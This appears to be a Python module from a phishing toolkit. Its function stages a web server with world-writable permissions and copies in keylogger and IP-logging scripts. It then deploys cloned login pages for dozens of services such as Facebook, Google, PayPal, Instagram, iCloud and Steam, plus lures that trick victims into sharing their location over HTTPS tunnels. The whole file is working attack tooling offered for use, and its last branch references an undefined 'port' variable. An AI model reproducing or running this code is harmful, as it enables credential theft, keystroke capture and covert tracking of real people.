from Defs.ImportManager.unsorted_will_be_replaced import run_command
from Defs.ImportManager.unsorted_will_be_replaced import webpage_set
from Defs.ImportManager.unsorted_will_be_replaced import wait
from Defs.ThemeManager.theme import default_palette






def run_phishing(page, custom_option):  # Phishing pages selection menu
    run_command('cd Server && mkdir www && chmod 777 Server -R')
    run_command('rm -r Server/www/ && mkdir Server/www')
    run_command('touch Server/www/usernames.txt && touch Server/www/ip.txt')
    run_command('cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/ && rm -rf link.url')
    if custom_option == '1' and page == 'Facebook':
        webpage_set("WebPages/fb_standard/", "Server/www/")
    elif custom_option == '2' and page == 'Facebook':
        webpage_set("WebPages/fb_advanced_poll/", "Server/www/")
    elif custom_option == '3' and page == 'Facebook':
        webpage_set("WebPages/fb_security_fake/", "Server/www/")
    elif custom_option == '4' and page == 'Facebook':
        webpage_set("WebPages/fb_messenger/", "Server/www/")
    elif custom_option == '1' and page == 'Google':
        webpage_set("WebPages/google_standard/", "Server/www/")
    elif custom_option == '2' and page == 'Google':
        webpage_set("WebPages/google_advanced_poll/", "Server/www/")
    elif custom_option == '3' and page == 'Google':
        webpage_set("WebPages/google_advanced_web/", "Server/www/")
    elif page == 'LinkedIn':
        webpage_set("WebPages/linkedin/", "Server/www/")
    elif page == 'GitHub':
        webpage_set("WebPages/GitHub/", "Server/www/")
    elif page == 'StackOverflow':
        webpage_set("WebPages/stackoverflow/", "Server/www/")
    elif page == 'WordPress':
        webpage_set("WebPages/wordpress/", "Server/www/")
    elif page == 'Twitter':
        webpage_set("WebPages/twitter/", "Server/www/")
    elif page == 'Snapchat':
        webpage_set("WebPages/Snapchat_web/", "Server/www/")
    elif page == 'Yahoo':
        webpage_set("WebPages/yahoo_web/", "Server/www/")
    elif page == 'Twitch':
        webpage_set("WebPages/twitch/", "Server/www/")
    elif page == 'Microsoft':
        webpage_set("WebPages/live_web/", "Server/www/")
    elif page == 'Steam':
        webpage_set("WebPages/steam/", "Server/www/")
    elif page == 'iCloud':
        webpage_set("WebPages/iCloud/", "Server/www/")
    elif custom_option == '1' and page == 'Instagram':
        webpage_set("WebPages/Instagram_web/", "Server/www/")
    elif custom_option == '2' and page == 'Instagram':
        webpage_set("WebPages/Instagram_autoliker/", "Server/www/")
    elif custom_option == '3' and page == 'Instagram':
        webpage_set("WebPages/Instagram_advanced_attack/", "Server/www/")
    elif custom_option == '4' and page == 'Instagram':
        webpage_set("WebPages/Instagram_VerifiedBadge/", "Server/www/")
    elif custom_option == '5' and page == 'Instagram':
        webpage_set("WebPages/instafollowers/", "Server/www/")
    elif custom_option == '1' and page == 'VK':
        webpage_set("WebPages/VK/", "Server/www/")
    elif custom_option == '2' and page == 'VK':
        webpage_set("WebPages/VK_poll_method/", "Server/www/")
    elif page == 'GitLab':
        webpage_set("WebPages/gitlab/", "Server/www/")
    elif page == 'NetFlix':
        webpage_set("WebPages/netflix/", "Server/www/")
    elif page == 'Origin':
        webpage_set("WebPages/origin/", "Server/www/")
    elif page == 'Pinterest':
        webpage_set("WebPages/pinterest/", "Server/www/")
    elif page == 'ProtonMail':
        webpage_set("WebPages/protonmail/", "Server/www/")
    elif page == 'Spotify':
        webpage_set("WebPages/spotify/", "Server/www/")
    elif page == 'Quora':
        webpage_set("WebPages/quora/", "Server/www/")
    elif page == 'PornHub':
        webpage_set("WebPages/pornhub/", "Server/www/")
    elif page == 'Adobe':
        webpage_set("WebPages/adobe/", "Server/www/")
    elif page == 'Badoo':
        webpage_set("WebPages/badoo/", "Server/www/")
    elif page == 'CryptoCurrency':
        webpage_set("WebPages/cryptocurrency/", "Server/www/")
    elif page == 'DevianArt':
        webpage_set("WebPages/devianart/", "Server/www/")
    elif page == 'DropBox':
        webpage_set("WebPages/dropbox/", "Server/www/")
    elif page == 'eBay':
        webpage_set("WebPages/ebay/", "Server/www/")
    elif page == 'Myspace':
        webpage_set("WebPages/myspace/", "Server/www/")
    elif page == 'PayPal':
        webpage_set("WebPages/paypal/", "Server/www/")
    elif page == 'Shopify':
        webpage_set("WebPages/shopify/", "Server/www/")
    elif page == 'Verizon':
        webpage_set("WebPages/verizon/", "Server/www/")
    elif page == 'Yandex':
        webpage_set("WebPages/yandex/", "Server/www/")
    elif custom_option == '1' and page == 'Reddit':
        webpage_set("WebPages/Reddit/", "Server/www/")
    elif custom_option == '2' and page == 'Reddit':
        webpage_set("WebPages/Reddit-old/", "Server/www/")
    elif page == 'Subitoit':
        webpage_set("WebPages/subitoit/", "Server/www/")
    elif page == 'PlayStation':
        webpage_set('WebPages/playstation/', "Server/www/")
    elif page == 'Xbox':
        webpage_set('WebPages/xbox/', "Server/www/")
    elif page == 'CUSTOM(1)':
        print("\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(1)".format(default_palette[0], default_palette[4]))
        print("\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(1)]".format(default_palette[0], default_palette[4]))
        input("\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.".format(default_palette[0], default_palette[4]))
        print("\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...".format(default_palette[0], default_palette[4]))
        wait(3)
        webpage_set('WebPages/CUSTOM(1)/', "Server/www/")
    elif page == 'CUSTOM(2)':
        print("\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(2)".format(default_palette[0], default_palette[4]))
        print("\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(2)]".format(default_palette[0], default_palette[4]))
        input("\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.".format(default_palette[0], default_palette[4]))
        print("\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...".format(default_palette[0], default_palette[4]))
        wait(3)
        webpage_set('WebPages/CUSTOM(2)/', "Server/www/")
    

    # Tools Below && Phishing Pages Above
    elif custom_option == '1' and page == 'LOCATION':
        wait(3)
        webpage_set('WebPages/TOOLS/nearyou', "Server/www/")
        print("\n\n{0}[{1}*{0}]{1} PLEASE USE TUNNELS/URL WITH '{0}https{1}' \n{0}[{1}*{0}]{1} Browsers Trusts only Https Links To Share Location\n".format(default_palette[0], default_palette[4]))
        input('\nPress Enter To continue...')
    elif custom_option == '2' and page == 'LOCATION':
        wait(3)
        webpage_set('WebPages/TOOLS/gdrive', "Server/www/")
        print("\n\n{0}[{1}*{0}]{1} PLEASE USE TUNNELS/URL WITH '{0}https{1}' \n{0}[{1}*{0}]{1} Browsers Trusts only Https Links To Share Location\n{0}[{1}*{0}]{1} {0}Tip: {1}Use Google Drive File Url as Custom Url while asked.".format(default_palette[0], default_palette[4]))
        input('\nPress Enter To continue...')

    else:
        endMessage(port)
